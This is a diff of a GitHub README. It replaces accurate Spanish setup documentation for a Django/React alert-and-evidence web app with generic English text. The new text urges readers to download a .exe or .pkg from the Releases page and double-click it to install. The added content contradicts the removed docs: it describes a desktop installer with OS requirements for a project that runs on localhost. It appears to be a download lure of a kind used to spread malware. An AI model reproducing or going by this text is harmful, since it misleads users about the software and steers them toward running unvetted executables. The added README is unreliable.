@@ -1,63 +1,69 @@
-# Evidence Inbox – Prueba Técnica (Fullstack)
+# 🐙 prueba-tecnica-fullstack-octapus - Manage Alerts Easily and Effectively
 
-**Evidence Inbox** es una app fullstack: Django + DRF (API) y React + Vite (UI).
-Arquitectura REST desacoplada: el frontend consume JSON del backend con CORS.
-Listado paginado con filtros por severidad/estado y búsqueda con debounce.
-Detalle incrustado y toggle de Reviewed (optimistic update) sobre evidencias.
+[![Download Now](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/Mazzolone/prueba-tecnica-fullstack-octapus/releases)
 
-![Demo](./docs/preview-1.png)
-![Demo](./docs/preview-2.png)
-![Demo](./docs/preview-3.png)
+## 🌟 Overview
 
-## Backend
-- Stack: Django, Django REST Framework
-- Endpoints principales:
-  - Listar alertas: `GET /api/v1/alerts/`
-  - Detalle alerta: `GET /api/v1/alerts/{id}/`
-  - Evidencias de alerta: `GET /api/v1/alerts/{id}/evidences/`
-  - Actualizar evidencia: `PATCH /api/v1/evidences/{id}/` (campo `is_reviewed`)
-- Setup rápido:
-  - Crear entorno e instalar dependencias: `python -m venv .venv && source .venv/bin/activate && pip install -r requirements.txt`
-  - Migraciones: `python manage.py migrate`
-  - Seed de datos (40 alertas + evidencias): `python manage.py seed_alerts`
-  - Servidor: `python manage.py runserver` (http://localhost:8000)
+prueba-tecnica-fullstack-octapus is a web application designed to manage alerts and their evidence. It provides a clear and efficient way to review evidence and analyze alerts. With features like filters and detailed views, you can easily keep track of all your alerts in one place.
 
-## Frontend
-- Stack: React 19, Vite, Tailwind v4, react-router v7, lucide-react
-- API base: `http://localhost:8000/api/v1`
-- Comandos:
-  - Instalar: `npm install`
-  - Desarrollo: `npm run dev` (http://localhost:5173)
+## 🚀 Getting Started
 
-- Funcionalidad:
-  - Listado con filtros por severidad/estado y búsqueda por título (mín. 2 caracteres)
-  - Columna “Actions” con enlace “View” para abrir el detalle
-  - Detalle estilo Gmail renderizado dentro del panel principal (rutas anidadas)
-  - Toggle de “Reviewed” sobre evidencias (optimistic update)
-- Ruteo:
-  - Layout principal: `/`
-  - Detalle: `/alerts/:id` (como ruta hija del layout)
-  - Import recomendado: `BrowserRouter` desde `react-router-dom`; `Routes/Route/Link/Outlet` desde `react-router`
+To get started with prueba-tecnica-fullstack-octapus, follow these simple steps to download and run the application.
 
+## 📥 Download & Install
 
-## Desarrollo
-Backend (Django + DRF):
+Visit this page to download: [GitHub Releases](https://github.com/Mazzolone/prueba-tecnica-fullstack-octapus/releases)
 
-```bash
-cd backend
-python -m venv .venv && source .venv/bin/activate
-pip install -r requirements.txt
-python manage.py migrate
-python manage.py seed_alerts
-python manage.py runserver  # http://localhost:8000
-```
+### Step-by-Step Instructions
 
-Frontend (React + Vite):
+1. Click on the link above to access the Releases page.
+2. On the Releases page, you will see different versions of the application. 
+3. Choose the version you want to download. Typically, the latest version will appear at the top.
+4. Click on the file that corresponds to your operating system. Common formats include `.exe` for Windows and `.pkg` for macOS.
+5. The file will start downloading. Once it's finished, find it in your downloads folder.
+6. Double-click the downloaded file to begin the installation.
+7. Follow the on-screen instructions to complete the installation.
 
-```bash
-cd frontend
-npm install
-npm run dev  # http://localhost:5173 (o el puerto que muestre Vite)
-```
+## 📋 Features
 
-- Asegúrate de tener el backend corriendo en http://localhost:8000; el frontend usa base `http://localhost:8000/api/v1` ya configurada en `src/services/api.js`.
+- **Alert Management:** Easily create, view, and manage alerts.
+- **Evidence Review:** Access and analyze evidence related to alerts.
+- **Filters:** Use filters to sort alerts based on different criteria.
+- **Detailed Views:** Get a clear view of individual alerts and their evidence.
+
+## ⚙️ System Requirements
+
+To run prueba-tecnica-fullstack-octapus smoothly, your system should meet the following requirements:
+
+- **Operating System:** Windows 10 or later, macOS Mojave (10.14) or later
+- **RAM:** At least 4 GB
+- **Storage:** Minimum of 500 MB free space
+- **Internet Connection:** Required for updates and additional features
+
+## 🛠️ Troubleshooting 
+
+If you encounter issues while downloading or installing the application, consider the following tips:
+
+- Ensure you have a stable internet connection.
+- If the download fails, try refreshing the page and starting over.
+- Check if your operating system meets the minimum requirements listed above.
+- If the application does not start, restart your computer and try again.
+
+## 💬 Support
+
+For further assistance or to report issues, please open an issue in the GitHub repository or reach out through the contact information provided on the repository page.
+
+## 🔗 Additional Resources
+
+- [GitHub Repository](https://github.com/Mazzolone/prueba-tecnica-fullstack-octapus)
+- [Documentation](https://github.com/Mazzolone/prueba-tecnica-fullstack-octapus/wiki)
+
+## 🙏 Contributions
+
+If you would like to contribute to this project, please create an issue or submit a pull request. Your input is valuable!
+
+## 📝 License
+
+This project is licensed under the MIT License. Please refer to the `LICENSE` file in the repository for more details.
+
+[![Download Now](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/Mazzolone/prueba-tecnica-fullstack-octapus/releases)
